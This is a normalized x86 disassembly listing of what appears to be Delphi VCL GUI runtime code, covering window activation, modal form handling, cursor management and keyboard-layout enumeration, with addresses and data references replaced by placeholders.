pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463a45
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_462228
sub_463a68
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463d30
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_444fc4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_465f08
xor edx edx
push ebp
push sub_463d13
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_4185cc
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_464f38
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_45dd48
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_463cf1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4639b8
xor edx edx
push ebp
push sub_463c50
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_463918
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_466d14
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_44d054
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_44d054
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463c57
mov eax [ ebp - 0x4 ]
call sub_4639b0
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_463c57
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463cfb
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_464f38
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_464f38
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_418548
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_4186ec
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45ddfc
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_463d40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_463d40
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_449d48
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_463db0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_463d40
pop ecx
mov eax [ esi + 0x34 ]
call sub_458658
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_458668
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_463e34
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b3a4
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_40346c
sub_463e58
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_40346c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_463e88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_463e58
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_463e88
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_449d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463f04
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_463e58
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_463e58
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_463e88
pop ecx
test al al
je r-xdata
sub_463f58
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_40346c
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_463f88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_449d84
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_463f58
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_463f88
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_449d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464004
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_463f58
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_463f58
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_463f88
pop ecx
test al al
je r-xdata
sub_464058
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_418550
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_452ca0
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4640ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_464058
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_40346c
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464128
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_420ffc
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_464164
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_446c48
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_44790c
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4641ac
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_44d054
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_44d054
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_44d054
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_44d054
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_44d054
push eax
call RedrawWindow
sub_464300
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_45efb8
mov dl 0x5
mov eax ebx
call sub_460e24
mov dl 0x1
mov eax ebx
call sub_44bc30
mov dl 0x3
mov eax ebx
call sub_461120
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_464368
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46443f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_44baf0
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44b95c
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_445c78
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4466d8
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4040d8
mov eax [ ebp - 0xc ]
call sub_4042a8
push eax
mov eax [ ebp - 0xc ]
call sub_4044a8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4466e8
mov eax [ ebp - 0xc ]
call sub_4042a8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464446
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
mov dl 0x1
mov eax esi
call sub_4604a4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_446794
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404634
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46446c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_449d84
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_45fbc8
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_449d48
mov edx ebx
pop ecx
mov si 0xffcc
call sub_40346c
inc ebp
dec edi
jne r-xdata
sub_4644b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_44baf0
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4644e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c2f8
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_46450c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_462874
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44d054
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_44baf0
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44d054
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44d054
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44bb04
or ecx 0xffffffff
mov dl 0x1
call sub_446e00
pop esi
pop ebx
retn
sub_4645a4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c768
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_44790c
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_446104
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_40346c
sub_4645fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4646c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4466d8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4040d8
mov eax [ ebp - 0x4 ]
call sub_4042a8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a8
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_4466e8
mov eax [ ebp - 0x4 ]
call sub_4042a8
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_446794
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4646c9
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_4604a4
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404634
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_4646e8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44c4e8
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44baf0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44bb04
mov dl [ ebx + 0x57 ]
call sub_446684
inc edi
dec esi
jne r-xdata
sub_46478c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_4647bc
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_4647ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42086c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_464b90
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_464b9c
mov eax ebx
call sub_464ba8
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_460fc4
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423744
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423744
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423744
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_464fc8
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_464ea4
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_464ea4
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_464ea4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_464944
push ebx
push esi
push edi
push ebp
call sub_403624
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403270
mov eax [ ebp + 0x88 ]
call sub_403270
mov eax [ ebp + 0x84 ]
call sub_403270
mov eax [ ebp + 0x54 ]
call sub_403270
mov eax [ ebp + 0x50 ]
call sub_403270
mov eax [ ebp + 0x4c ]
call sub_403270
mov eax [ ebp + 0x30 ]
call sub_403270
mov eax [ ebp + 0x34 ]
call sub_403270
mov eax [ ebp + 0x7c ]
call sub_403270
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403270
mov eax ebp
call sub_464c04
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4208b8
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40360c
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_418550
call sub_403270
inc edi
dec esi
jne r-xdata
sub_464abc
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_464b08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4183f4
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4183f4
mov eax [ rw-data ]
call sub_467894
sub_464b40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4186ec
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4186ec
mov eax [ rw-data ]
call sub_467894
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_44e62c
sub_464ba8
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_464c60
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_464c04
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_402714
mov ebx esi
test ebx ebx
jne r-xdata
sub_464c60
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026f4
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_464c88
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_464e33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e3a
lea eax [ ebp - 0x260 ]
call sub_403fe8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403fe8
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41a8b8
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
